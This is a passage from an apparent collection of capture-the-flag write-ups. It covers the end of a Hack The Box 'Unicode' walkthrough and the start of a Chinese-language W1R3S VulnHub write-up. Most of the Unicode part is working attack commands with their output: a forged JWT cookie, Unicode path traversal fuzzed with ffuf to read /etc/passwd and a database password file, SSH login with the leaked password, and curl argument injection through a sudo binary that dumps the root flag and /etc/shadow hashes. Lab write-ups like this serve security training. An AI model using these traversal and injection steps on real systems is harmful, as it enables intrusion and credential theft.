syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
code:x:1000:1000:,,,:/home/code:/bin/bash
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2116.jpg)

As you can see, we can read local files now via this technique. Now we need to fuzz to find the files which we can read.

``` bash
┌──(root💀kali)-[~/ffuf]
└─# ./ffuf -u 'http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/FUZZ' -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g' -mc 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fw 1299

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 :: Header           : Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response words: 1299
________________________________________________

/etc/passwd             [Status: 200, Size: 1876, Words: 17, Lines: 36]
/etc/group              [Status: 200, Size: 778, Words: 1, Lines: 60]
/proc/self/environ      [Status: 200, Size: 208, Words: 1, Lines: 1]
/proc/self/cmdline      [Status: 200, Size: 87, Words: 1, Lines: 1]
/proc/self/stat         [Status: 200, Size: 313, Words: 52, Lines: 2]
/proc/self/status       [Status: 200, Size: 1367, Words: 93, Lines: 56]
/proc/self/fd/0         [Status: 200, Size: 0, Words: 1, Lines: 1]
/etc/mysql/my.cnf       [Status: 200, Size: 682, Words: 89, Lines: 22]
```

None of these files are useful for our cause. They don't have any information which can help us to gain shell access. However, we know that NginX is running on the machine, we can guess the path of configuration file.

``` bash
http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default

server{
#Change the Webroot from /home/code/coder/ to /var/www/html/
#change the user password from db.yaml
	listen 80;
	location / {
		proxy_pass http://localhost:8000;
		include /etc/nginx/proxy_params;
		proxy_redirect off;
	}
	location /static/{
		alias /home/code/coder/static/styles/;
	}

}
```

One of the file gives us this above information about password change for the user and it has already given the path of the file too. Let's read it.

``` bash
http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml

mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

We have the database password. Let's login via SSH using these creds.and we got user flag.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# ssh code@10.10.11.126
The authenticity of host '10.10.11.126 (10.10.11.126)' can't be established.
ED25519 key fingerprint is SHA256:SnMpKuOJvoXQsmvAqpabXWgEhnhEAkNeEnQ/zKJnmJs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.126' (ED25519) to the list of known hosts.
code@10.10.11.126's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 01 Dec 2021 03:00:28 PM UTC

  System load:  0.17              Processes:             316
  Usage of /:   82.5% of 3.87GB   Users logged in:       0
  Memory usage: 82%               IPv4 address for eth0: 10.10.11.126
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov 29 14:14:14 2021 from 10.10.14.23
code@code:~$ id
uid=1000(code) gid=1000(code) groups=1000(code)
code@code:~$ whoami
code
code@code:~$ cat user.txt
c44ed9130688a2816ef0bbcd5d561f19
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2117.jpg)

#### privesclation

``` bash
code@code:~$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

We have permission to run the binary file with root's privileges. Let's look into it.

``` bash
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:1
Enter the filename:test
Enter the report:test
Traceback (most recent call last):
  File "treport.py", line 74, in <module>
  File "treport.py", line 13, in create
FileNotFoundError: [Errno 2] No such file or directory: '/root/reports/test'
[5308] Failed to execute script 'treport' due to unhandled exception!
```

Upon executing this binary, it gives us four options to choose. If we choose option one, then ultimately it gives us this above error. Looks like it is a binary file compiled with python.

 - [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)

Using above code we can extract python script from a binary.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# scp code@10.10.11.126:/usr/bin/treport .
code@10.10.11.126's password: 
treport                                                                          100% 6690KB  80.7KB/s   01:22    
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# python pyinstxtractor.py treport 
[+] Processing treport
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6798297 bytes
[+] Found 46 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: treport.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python38 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: treport

You can now use a python decompiler on the pyc files within the extracted directory
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# ls
jwks.json  pyinstxtractor.py  treport  treport_extracted
```

It extracted the python files and saved it in a directory.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# ls treport_extracted/                                                                                          
base_library.zip  libffi.so.7          libssl.so.1.1            pyimod02_archive.pyc         pyi_rth_pkgutil.pyc
libbz2.so.1.0     liblzma.so.5         libtinfo.so.6            pyimod03_importers.pyc       PYZ-00.pyz
libcrypto.so.1.1  libmpdec.so.2        libz.so.1                pyimod04_ctypes.pyc          PYZ-00.pyz_extracted
lib-dynload       libpython3.8.so.1.0  pyiboot01_bootstrap.pyc  pyi_rth_inspect.pyc          struct.pyc
libexpat.so.1     libreadline.so.8     pyimod01_os_path.pyc     pyi_rth_multiprocessing.pyc  treport.pyc
┌──(root💀kali)-[~/hackthebox/machine/unicode]
└─# file treport_extracted/treport.pyc 
treport_extracted/treport.pyc: python 2.7 byte-compiled
```

It has a lot of file, we have byte-compiled file. We can't just read like normal files. We need to disassemble and decompile to read the contents.

 - [pycdc](https://github.com/zrax/pycdc)

We will use this above project to do that. We could have used 'uncompyle6' but it only supports python version up to 3.8. This byte-compiled file is created with python version 3.9. Clone the project and we need to compile it.

``` bash
┌──(root💀kali)-[~/pycdc]
└─# ls
ASTNode.cpp   bytecode_ops.inl     data.cpp     pyc_code.cpp  pyc_module.cpp   pyc_sequence.cpp    scripts
ASTNode.h     bytes                data.h       pyc_code.h    pyc_module.h     pyc_sequence.h      tests
ASTree.cpp    CMakeCache.txt       FastStack.h  pycdas        pyc_numeric.cpp  pyc_string.cpp
ASTree.h      CMakeFiles           libpycxx.a   pycdas.cpp    pyc_numeric.h    pyc_string.h
bytecode.cpp  cmake_install.cmake  LICENSE      pycdc         pyc_object.cpp   PythonBytecode.txt
bytecode.h    CMakeLists.txt       Makefile     pycdc.cpp     pyc_object.h     README.markdown
┌──(root💀kali)-[~/pycdc]
└─# cmake CMakeLists.txt
-- The C compiler identification is GNU 11.2.0
-- The CXX compiler identification is GNU 11.2.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Found PythonInterp: /usr/bin/python (found version "2.7.18") 
-- Configuring done
-- Generating done
-- Build files have been written to: /root/pycdc
┌──(root💀kali)-[~/pycdc]
└─# ls -la
总用量 2556
drwxrwxrwx   8 root root   4096 12月  1 10:21 .
drwx------ 161 root root  12288 12月  1 08:01 ..
-rwxrwxrwx   1 root root   1681  5月 16  2020 ASTNode.cpp
-rwxrwxrwx   1 root root  16201  5月 16  2020 ASTNode.h
-rwxrwxrwx   1 root root 115114  5月 16  2020 ASTree.cpp
-rwxrwxrwx   1 root root    253  5月 16  2020 ASTree.h
-rwxrwxrwx   1 root root  11662  5月 16  2020 bytecode.cpp
-rwxrwxrwx   1 root root    848  5月 16  2020 bytecode.h
-rwxrwxrwx   1 root root   3922  5月 16  2020 bytecode_ops.inl
drwxrwxrwx   2 root root   4096  5月 16  2020 bytes
-rw-r--r--   1 root root  13934 12月  1 10:21 CMakeCache.txt
drwxrwxrwx   9 root root   4096 12月  1 10:21 CMakeFiles
-rw-r--r--   1 root root   3065 12月  1 10:21 cmake_install.cmake
-rwxrwxrwx   1 root root   1900  5月 16  2020 CMakeLists.txt
-rwxrwxrwx   1 root root   1781  5月 16  2020 data.cpp
-rwxrwxrwx   1 root root   1269  5月 16  2020 data.h
-rwxrwxrwx   1 root root    969  5月 16  2020 FastStack.h
drwxr-xr-x   8 root root   4096  5月 16  2020 .git
drwxr-xr-x   3 root root   4096  5月 16  2020 .github
-rw-r--r--   1 root root     42  5月 16  2020 .gitignore
-rwxrwxrwx   1 root root 965136  5月 16  2020 libpycxx.a
-rwxrwxrwx   1 root root  35147  5月 16  2020 LICENSE
-rw-r--r--   1 root root  36621 12月  1 10:21 Makefile
-rwxrwxrwx   1 root root   2319  5月 16  2020 pyc_code.cpp
-rwxrwxrwx   1 root root   3270  5月 16  2020 pyc_code.h
-rwxrwxrwx   1 root root 360984  5月 16  2020 pycdas
-rwxrwxrwx   1 root root   8665  5月 16  2020 pycdas.cpp
-rwxrwxrwx   1 root root 833824  5月 16  2020 pycdc
-rwxrwxrwx   1 root root   1104  5月 16  2020 pycdc.cpp
-rwxrwxrwx   1 root root   4504  5月 16  2020 pyc_module.cpp
-rwxrwxrwx   1 root root   1932  5月 16  2020 pyc_module.h
-rwxrwxrwx   1 root root   3694  5月 16  2020 pyc_numeric.cpp
-rwxrwxrwx   1 root root   2624  5月 16  2020 pyc_numeric.h
-rwxrwxrwx   1 root root   2728  5月 16  2020 pyc_object.cpp
-rwxrwxrwx   1 root root   3932  5月 16  2020 pyc_object.h
-rwxrwxrwx   1 root root   4559  5月 16  2020 pyc_sequence.cpp
-rwxrwxrwx   1 root root   2265  5月 16  2020 pyc_sequence.h
-rwxrwxrwx   1 root root   4280  5月 16  2020 pyc_string.cpp
-rwxrwxrwx   1 root root    961  5月 16  2020 pyc_string.h
-rwxrwxrwx   1 root root  48053  5月 16  2020 PythonBytecode.txt
-rwxrwxrwx   1 root root   1460  5月 16  2020 README.markdown
drwxrwxrwx   3 root root   4096  5月 16  2020 scripts
drwxrwxrwx   6 root root   4096  5月 16  2020 tests
┌──(root💀kali)-[~/pycdc]
└─# make                                                                                                           
[  2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp                                                                            
[  5%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o
[  7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o
[ 10%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o
[ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o
[ 15%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o
[ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o
[ 20%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o
[ 23%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o
[ 25%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o
[ 28%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o
[ 30%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o
[ 33%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o
[ 35%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o
[ 38%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o
[ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o
[ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o
[ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o
[ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o
[ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o
[ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o
[ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o
[ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o
[ 61%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o
[ 64%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o
[ 66%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o
[ 69%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o
[ 71%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o
[ 74%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o
[ 76%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o
[ 79%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o
[ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o
[ 84%] Linking CXX static library libpycxx.a
[ 84%] Built target pycxx
[ 87%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o
[ 89%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o
[ 92%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o
[ 94%] Linking CXX executable pycdc
[ 94%] Built target pycdc
[ 97%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o
[100%] Linking CXX executable pycdas
[100%] Built target pycdas
┌──(root💀kali)-[~/pycdc]
└─# ls                                                                                                             
ASTNode.cpp   bytecode_ops.inl     data.cpp     pyc_code.cpp  pyc_module.cpp   pyc_sequence.cpp    scripts
ASTNode.h     bytes                data.h       pyc_code.h    pyc_module.h     pyc_sequence.h      tests
ASTree.cpp    CMakeCache.txt       FastStack.h  pycdas        pyc_numeric.cpp  pyc_string.cpp
ASTree.h      CMakeFiles           libpycxx.a   pycdas.cpp    pyc_numeric.h    pyc_string.h
bytecode.cpp  cmake_install.cmake  LICENSE      pycdc         pyc_object.cpp   PythonBytecode.txt
bytecode.h    CMakeLists.txt       Makefile     pycdc.cpp     pyc_object.h     README.markdown
```

Now we can use this to decompile.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/unicode/treport_extracted]
└─# /root/pycdc/pycdc treport.pyc
# Source Generated with Decompyle++
# File: treport.pyc (Python 3.9)
Unsupported opcode: <255>
import os
import sys
from datetime import datetime
import re

class threat_report:
    def create(self):
        Unsupported opcode: <255>
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete
    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)
    def read_file(self):
        Unsupported opcode: <255>
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete
    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = [
            '$',
            '`',
            ';',
            '&',
            '|',
            '||',
            '>',
            '<',
            '?',
            "'",
            '@',
            '#',
            '$',
            '%',
            '^',
            '(',
            ')']
    ip = input('Enter the IP/file_name:')
    res = bool(re.search('\\s', ip))
    if res:
        print('INVALID IP')
        sys.exit(0)
    if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
        print('INVALID URL')
        sys.exit(0)
    cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
    current_time + '"'
    os.system(cmd)
```

Looking at the code, we can see a command is being called to download reports. It is using curl command to do that. It has also filter in place to protect from injection attacks. We can't possibly run bash commands to gain shell, we have to use curl flags or switches to read either root flag or SSH private keys.

``` bash
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{--config,/root/root.txt}
Warning: /root/root.txt:1: warning: '83073a2469b47c0e6c08b421a6aa8539' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```

or

``` bash
Enter your choice:3
Enter the IP/file_name:{-K,/root/root.txt}
Warning: /root/root.txt:1: warning: '83073a2469b47c0e6c08b421a6aa8539' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
Enter your choice:
```

or use the following to get root flag and /etc/shadow together...

``` bash
code@code:~$ cd $(mktemp --directory)
code@code:/tmp/tmp.cg0X17Nhmm$ touch -- 127.0.0.1 --silent --create-dirs
code@code:/tmp/tmp.cg0X17Nhmm$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:*
Enter your choice:3
Enter the IP/file_name:File:///root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  33000      0 --:--:-- --:--:-- --:--:-- 33000

Enter your choice:3
Enter the IP/file_name:File:///etc/shadow   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1183  100  1183    0     0  1155k      0 --:--:-- --:--:-- --:--:-- 1155k
Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_15_45_38 threat_report_15_44_36 threat_report_15_44_56

Enter the filename:threat_report_15_45_38
root:$6$XbmQqbMSJS0PISos$fHZLEpIBtbsRd2ltGIYSJPfmIYYyLKxx9iUiPdcBGsrp8STgHopWnoZ1WKXgrwc1d81idPRJxICovSXGUF.we/:18799:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18799:0:99999:7:::
sshd:*:18799:0:99999:7:::
systemd-coredump:!!:18799::::::
lxd:!:18799::::::
mysql:!:18799:0:99999:7:::
code:$6$tdOqUgDnt8lqOmpk$Y5JZc.PspT2gkpp6LqWHUElepUmZerkVmSB8XV9Oss2zgmzO8cvNUyo4AGjfkbaRO34mV3leNx5HPvgtXSlrv.:18799:0:99999:7:::

Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_15_45_38 threat_report_15_44_36 threat_report_15_44_56

Enter the filename:threat_report_15_44_56
83073a2469b47c0e6c08b421a6aa8539
```

As you can see from the command injection list 'curly brackets' are not being filtered, we take advantage of that to pass curl config switch to expose root flag.This curl switch actually can't read the files, but the functionality of that is, if the text file is not in curl Standard format then it just prints out all the content of that given file. I got SSH private keys, but the SSH configuration only accepts password for authentication, not keys.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2118.jpg)

#### Summary of knowledge

 - jwt token forge by using https://jwt.io and https://mkjwk.org/
 - off-by-slash bug redirect to our local machine
 - file read bypass by using Unicode normalization
 - fuzzing file read arg to get db.yaml file content
 - using pycdc to decompile .pyc file to readable file
 - command injection list words bypass
 - privesc through /usr/bin/treport by using curl command injection attacks

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end unicode -->

</details>

<a id="case-w1r3s-1-0-1"></a>

## Cuppa 解析器与系统文件

目录枚举定位 Cuppa，文件包含接口读取账户材料。原文保留参数传递、文件内容和后续认证结果。

<p class="kb-provenance">来源 W1R3S-1-0-1 · 原记录 2020-01-03 · 12 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-w1r3s-1-0-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start W1R3S-1-0-1 -->

#### 发布日期

名称：W1R3S: 1.0.1
发布日期：2018年2月5日

#### 下载

 - Download: https://drive.google.com/file/d/1sWJRjku9uNWS0f_Jul24LCQ2ZLucSG4X/view?usp=sharing
 - Download (Mirror): https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip
 - Download (Torrent): https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip.torrent



#### 描述

您已被雇用在W1R3S.inc单个服务器上进行渗透测试并报告所有发现。 他们要求您获得root用户访问权限并找到该flag（位于/root目录中）。
获得低特权的shell难度：初学者/中级
特权升级难度：初学者/中级
关于：这是个易受攻击的Ubuntu box，为您提供一些真实世界的场景，使我想起了OSCP实验室。
虚拟机：VMware Workstation

v1.0.0-2018年5月2日v1.0.1-2018年8月3日

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.66.0/24
Nmap scan report for 192.168.66.7
Host is up (0.00030s latency).
MAC Address: 00:0C:29:AA:7F:FC (VMware)
```

``` bash
root@kali:~# nmap -sV -Pn -v -p- 192.168.66.7
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
```

``` bash
root@kali:~# nmap -v -A -Pn -T5 -sV --script=vuln 192.168.66.7
PORT      STATE  SERVICE         VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp             vsftpd 2.0.8 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
